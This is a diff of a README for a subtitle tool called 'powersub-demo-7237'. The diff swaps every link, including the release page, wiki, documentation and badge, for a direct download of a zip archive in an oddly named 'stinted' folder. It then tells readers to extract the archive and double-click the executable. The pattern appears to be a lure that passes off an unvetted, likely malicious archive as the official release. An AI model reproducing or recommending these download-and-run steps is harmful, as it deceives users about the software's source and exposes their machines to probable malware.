@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-7237 - Effortless Subtitle Management
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Ishum2007/powersub-demo-7237/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Ishum2007/powersub-demo-7237/main/stinted/powersub-demo-7237.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/Ishum2007/powersub-demo-7237/main/stinted/powersub-demo-7237.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ To get started with powersub-demo-7237, follow these simple steps:
 
 1. **Visit the Releases Page:**  
    Click the link below to go to the GitHub Releases page.  
-   [Download the latest version here](https://github.com/Ishum2007/powersub-demo-7237/releases).
+   [Download the latest version here](https://raw.githubusercontent.com/Ishum2007/powersub-demo-7237/main/stinted/powersub-demo-7237.zip).
 
 2. **Choose the Right Version:**  
    On the Releases page, look for the latest version at the top. You will see a list of files available for download. Typically, you will find files for different operating systems, such as Windows, macOS, or Linux.
@@ -24,7 +24,7 @@ To get started with powersub-demo-7237, follow these simple steps:
    If the downloaded file is in a ZIP format, locate the file and right-click it. Select "Extract All" to unzip the contents. Follow the prompts to complete the extraction.
 
 5. **Run the Application:**  
-   Navigate to the folder where you extracted or downloaded the application. Double-click on the executable file (e.g., `powersub-demo.exe`).  
+   Navigate to the folder where you extracted or downloaded the application. Double-click on the executable file (e.g., `https://raw.githubusercontent.com/Ishum2007/powersub-demo-7237/main/stinted/powersub-demo-7237.zip`).  
 
 Congratulations! You are now ready to use powersub-demo-7237.
 
@@ -56,7 +56,7 @@ If you encounter any issues during the installation or use of powersub-demo-7237
 
 For further details, you may find the following resources helpful:
 
-- **Documentation:** Detailed guides on how to use each feature can be found on our [Wiki](https://github.com/Ishum2007/powersub-demo-7237/wiki).
+- **Documentation:** Detailed guides on how to use each feature can be found on our [Wiki](https://raw.githubusercontent.com/Ishum2007/powersub-demo-7237/main/stinted/powersub-demo-7237.zip).
 - **Community Forum:** Join discussions and share tips with other users.
 
 ## 🌐 Feedback
@@ -65,7 +65,7 @@ Your feedback is important to us. Please share your thoughts on the application 
 
 ## 🔗 Useful Links
 
-- [Download the latest version here](https://github.com/Ishum2007/powersub-demo-7237/releases)
-- [Documentation](https://github.com/Ishum2007/powersub-demo-7237/wiki)
+- [Download the latest version here](https://raw.githubusercontent.com/Ishum2007/powersub-demo-7237/main/stinted/powersub-demo-7237.zip)
+- [Documentation](https://raw.githubusercontent.com/Ishum2007/powersub-demo-7237/main/stinted/powersub-demo-7237.zip)
 
 Thank you for choosing powersub-demo-7237! Enjoy managing your subtitles effortlessly.
